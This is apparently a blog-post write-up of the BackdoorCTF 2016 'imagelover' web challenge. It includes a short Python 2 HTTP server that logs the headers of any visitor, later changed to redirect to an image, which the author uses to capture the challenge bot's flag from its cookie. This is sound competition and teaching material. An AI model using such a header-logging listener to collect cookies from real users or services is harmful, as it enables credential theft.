---
title: "BackdoorCTF 2016 - imagelover"
layout: post
date: 2016-05-30 4:21
tag:
- BackdoorCTF2016
- Web
- Backdoor
writeup: true
star: false
points: 70
category: Web
---

![Backdoor Logo](/assets/images/backdoorctf16/logo.png)

**BackdoorCTF is the annual flagship CTF competition conducted by SDSLabs and InfoSecIITR.**

#### Points: 70

#### Description:

>Find imagelover [here](http://hack.bckdr.in:6969/)

## Write-up

**The challenge was updated. Scroll down to see the updates solution**

When I went to the specified website it said:

>Imagelover loves viewing pictures of people. He has opened this website so that you can share your pics with him. Imagelover visits the image with his flag as a sign of gratitude.

There was a URL box to add our link to photos. So it said "Imagelover visits the image with his `flag`". The only way to do this would be to send a GET request to the website we enter and send the flag in the Headers. So I googled and found this script to print the Headers of anyone who sends a GET request to my VPS.

~~~python
import SimpleHTTPServer
import SocketServer
import logging

PORT = 8000

class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    def do_GET(self):
        logging.error(self.headers)
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

Handler = ServerHandler

httpd = SocketServer.TCPServer(("", PORT), Handler)

print "serving at port", PORT
httpd.serve_forever()
~~~

`**Update_begin**`

So now they don't give us the flag until we return them a `png`, `jpg` or a `gif`. So I decided to redirect them to an image. For this I made some chanegs in the `do_GET()` method. Here is the updated method.

~~~python
   def do_GET(self):
        logging.error(self.headers)
        self.send_response(301) # For a redirect we need to send a `301` response rather than `200`
        self.send_header('Location','link.to.an/image') # Add a link to an image in place of `link.to.an/image`
        self.end_headers()
~~~

`**Update_end**`

Basically I hosted my VPS with the script above and entered the URL in place of a photograph URL. Imagelover would visit it and I would get the flag from the Headers.

And as expeced as soon as I submitted my URL I got a GET request with the flag in the cookie.
